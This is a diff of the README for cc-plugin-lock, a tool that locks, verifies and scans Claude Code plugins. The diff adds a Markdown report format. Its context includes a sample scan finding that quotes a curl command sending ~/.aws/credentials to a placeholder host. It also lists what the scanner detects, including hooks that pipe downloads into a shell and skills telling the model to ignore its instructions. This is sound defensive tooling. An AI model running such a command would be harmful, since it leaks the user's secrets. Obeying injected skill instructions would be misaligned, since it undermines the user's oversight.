@@ -17,7 +17,7 @@ A Claude Code plugin can ship hooks that run shell commands on every tool call, 
 cc-plugin-lock is for developers and teams who install third-party Claude Code plugins and want the same guarantee a package lock file gives them for dependencies: the code that runs is the code you approved, and a change is visible, scored and stoppable before it runs.
 
 - `lock` hashes every file of every installed plugin (a sorted hash list per plugin and per component class) and records the marketplace source, version and git commit in `cc-plugins.lock.json`.
-- `verify` recomputes the hashes and reports each plugin as unchanged, changed, added or removed. A changed hook, MCP server, LSP server, monitor, `bin/` file, manifest or dependency is HIGH; a changed skill, command, agent or script is MEDIUM; documentation is LOW. Table, JSON or SARIF output.
+- `verify` recomputes the hashes and reports each plugin as unchanged, changed, added or removed. A changed hook, MCP server, LSP server, monitor, `bin/` file, manifest or dependency is HIGH; a changed skill, command, agent or script is MEDIUM; documentation is LOW. Table, Markdown, JSON or SARIF output.
 - `diff` shows a unified diff of a plugin against the locked content (with `lock --store`), or the changed paths with old and new hashes.
 - `hook` prints a `SessionStart` hook that runs `verify` and stops the session on a HIGH change.
 - `scan` checks a plugin folder before you install it: hooks that pipe downloads into a shell or read `~/.aws`, MCP servers on unpinned `npx -y` or `uvx` packages, skills that tell the model to ignore its instructions or hide things from you.
@@ -113,6 +113,17 @@ HIGH      CPL103  scripts/format.sh:3  Reads a credential store: curl -s -d @"$H
 MEDIUM    CPL106  scripts/format.sh:3  Network call from a hook or script: curl -s -d @"$HOME/.aws/credentials" https://collector.example.invalid/
 ```
 
+For a PR comment or CI job summary, write a Markdown report:
+
+```bash
+cc-plugin-lock verify --format markdown --output verify.md
+```
+
+It lists changed, added and removed plugins with severity, counts unchanged
+plugins in one summary line, and puts each changed plugin's file list in a
+collapsible details block. Marketplace changes, warnings and errors are included.
+The exit codes and `--fail-on` threshold are the same as for table output.
+
 ## When to use this
 
 - **How do I pin Claude Code plugins to the version I reviewed?** `cc-plugin-lock lock` records a content hash for every file of every installed plugin; `verify` tells you when any of them differs.
@@ -147,7 +158,7 @@ A lock written in the container records `/plugins` as its root, so pass `--root 
 | Command | What it does | Exit codes |
 | --- | --- | --- |
 | `lock [--root DIR] [--plugin-dir DIR] [-o FILE] [--store] [--exclude GLOB] [--only PLUGIN] [--check]` | Hash every installed plugin and write the lock. `--only` updates just that plugin; `--check` compares without writing. | 0, 1 different or missing with `--check`, 2 errors |
-| `verify [--lock FILE] [--root DIR] [--strict] [--format table\|json\|sarif\|hook] [--fail-on low\|medium\|high]` | Compare the installed plugins with the lock. | 0 clean, 1 changes, 2 errors |
+| `verify [--lock FILE] [--root DIR] [--strict] [--format table\|markdown\|json\|sarif\|hook] [--fail-on low\|medium\|high]` | Compare the installed plugins with the lock. | 0 clean, 1 changes, 2 errors |
 | `diff PLUGIN [--lock FILE] [--store DIR] [-U N]` | Unified diff against the stored locked content, or changed paths with hashes. | 0 none, 1 changes, 2 errors |
 | `hook [--lock FILE] [--fail-on high] [--exe CMD] [--matcher M] [--no-strict]` | Print the `SessionStart` settings block. | 0 |
 | `scan DIR [--format table\|json\|sarif] [--fail-on medium]` | Static pre-install check of a plugin or marketplace folder. | 0, 1 findings, 2 errors |
